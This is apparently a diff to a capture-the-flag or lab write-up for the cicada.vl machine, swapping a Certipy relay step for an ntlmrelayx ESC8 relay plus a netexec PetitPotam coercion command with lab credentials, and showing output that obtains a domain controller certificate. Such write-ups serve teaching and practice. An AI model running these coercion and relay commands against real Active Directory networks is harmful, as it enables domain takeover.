@@ -530,17 +530,39 @@ bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl
 [+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
 ```
 
-start `certipy relay` targeting the ADCS webserver, and it listens on SMB:
+start `ntlm relay` targeting the ADCS webserver, and it listens on SMB:
 
 ```
-certipy-ad relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController 
-Certipy v5.0.4 - by Oliver Lyak (ly4k)
+impacket-ntlmrelayx -smb2support --target 'http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp' --adcs --template DomainController
+```
 
-/usr/lib/python3/dist-packages/impacket/mssql/version.py:182: SyntaxWarning: 'return' in a 'finally' block
-  return string
-[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
-[*] Listening on 0.0.0.0:445
-[*] Setting up SMB Server on port 445
+```
+netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
+/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
+  return True
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)                                                                                  
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
+COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
+COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
+
+```
+
+```
+[*] Servers started, waiting for connections
+[*] (SMB): Received connection from 10.129.150.101, attacking target http://DC-JPQ225.cicada.vl
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (SMB): Authenticating connection from /@10.129.150.101 against http://DC-JPQ225.cicada.vl SUCCEED [1]
+[*] (SMB): Received connection from 10.129.150.101, attacking target http://DC-JPQ225.cicada.vl
+[*] http:///@dc-jpq225.cicada.vl [1] -> Generating CSR...
+[*] http:///@dc-jpq225.cicada.vl [1] -> CSR generated!
+[*] http:///@dc-jpq225.cicada.vl [1] -> Getting certificate...
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (SMB): Authenticating connection from /@10.129.150.101 against http://DC-JPQ225.cicada.vl SUCCEED [2]
+[*] http:///@dc-jpq225.cicada.vl [2] -> Skipping user  since attack was already performed
+[*] http:///@dc-jpq225.cicada.vl [1] -> GOT CERTIFICATE! ID 88
+[*] http:///@dc-jpq225.cicada.vl [1] -> Writing PKCS#12 certificate to ./DC-JPQ225.cicada.vl.pfx
+[*] http:///@dc-jpq225.cicada.vl [1] -> Certificate successfully written to file
+
 
 ```
 
